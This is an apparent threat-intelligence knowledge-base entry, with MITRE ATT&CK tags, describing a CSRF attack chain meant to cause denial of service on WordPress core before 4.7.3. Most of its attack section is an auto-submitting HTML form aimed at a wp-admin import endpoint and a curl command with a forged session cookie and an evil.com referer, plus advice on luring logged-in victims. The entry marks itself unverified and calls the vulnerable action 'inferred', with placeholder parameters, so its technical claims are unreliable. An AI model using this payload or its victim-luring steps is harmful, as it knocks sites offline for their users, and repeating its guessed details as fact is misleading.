---
id: ac-wordpress-csrf-dos-001
tags:
  - csrf
  - dos
  - wordpress
  - resource-exhaustion
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-WordPress-CSRF-for-Resource-Exhaustion]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:27:23.579Z'
description: >-
  A CSRF vulnerability in WordPress core allows attackers to forge requests that
  trigger resource-intensive operations, causing server exhaustion and denial of
  service to legitimate users.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
---
# WordPress Core DoS via CSRF Leading to Uncontrolled Resource Consumption

Multi-stage attack chain demonstrating a complete attack workflow exploiting a CSRF vulnerability in WordPress core to induce denial of service through resource exhaustion.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via CSRF] --> B[Trigger Resource Exhaustion]
    B --> C[DoS Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard web browser or curl for request forgery)

### Target Environment

- WordPress core versions prior to 4.7.3
- Web platform with PHP backend
- Exposed WordPress admin or user-facing endpoints vulnerable to CSRF
- Network access to the target WordPress site

### Initial Access Requirements

- Ability to trick a logged-in user into visiting a malicious page (e.g., via phishing or social engineering)
- No prior credentials needed, but victim must be authenticated to WordPress
- Public network access to the target site

## Detailed Attack Procedures

### Step 1: Forge CSRF Request to Trigger Resource-Intensive Operation
procedure: [[procedures/Exploit-WordPress-CSRF-for-Resource-Exhaustion]]

**Objective**: Exploit the lack of nonce verification in a WordPress core action to send a forged request that performs heavy resource consumption, exhausting server CPU/memory and denying service.

**Instructions**: Create a malicious HTML page that automatically submits a form to the vulnerable WordPress endpoint when loaded by an authenticated user. Host this page on an attacker-controlled server. Alternatively, use curl to simulate the forged request if testing directly.

First, craft and host the malicious page using a simple HTML form targeting the vulnerable action (inferred as a core function like batch processing or import without nonce):

```html
<!DOCTYPE html>
<html>
<body>
<form action="https://target.com/wp-admin/admin.php?import=wordpress" method="post" id="csrf-form">
    <input type="hidden" name="import" value="resource-heavy-action">
    <input type="hidden" name="file" value="large-dummy-file.txt">
    <!-- Additional params to trigger intensive operation -->
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

Trick the victim into visiting this page while logged into WordPress. Monitor server load to confirm exhaustion.

For direct testing with [[commands/curl-csrf-exploit]]:

```bash
curl -X POST 'https://target.com/wp-admin/admin.php?import=wordpress' \
     -d 'import=wordpress&file=large-file&action=process' \
     -H 'Cookie: wordpress_logged_in=valid_session' \
     --referer 'https://evil.com'
```

**Expected Output**: Server responds with 200 OK or partial processing, but logs show high CPU/memory usage; site becomes unresponsive to other requests.

**Success Indicators**:
- Server resource usage spikes (e.g., via monitoring tools like top or htop)
- Legitimate requests to WordPress timeout or fail
- No nonce error, confirming CSRF success

## Attack Chain Summary

### Key Achievements

1. Bypassed CSRF protection to execute unauthorized action
2. Induced uncontrolled resource consumption on the server
3. Achieved denial of service impacting all users

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Endpoint Denial of Service]] Endpoint Denial of Service

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

---
*Last updated: 2023-10-01T00:00:00Z*
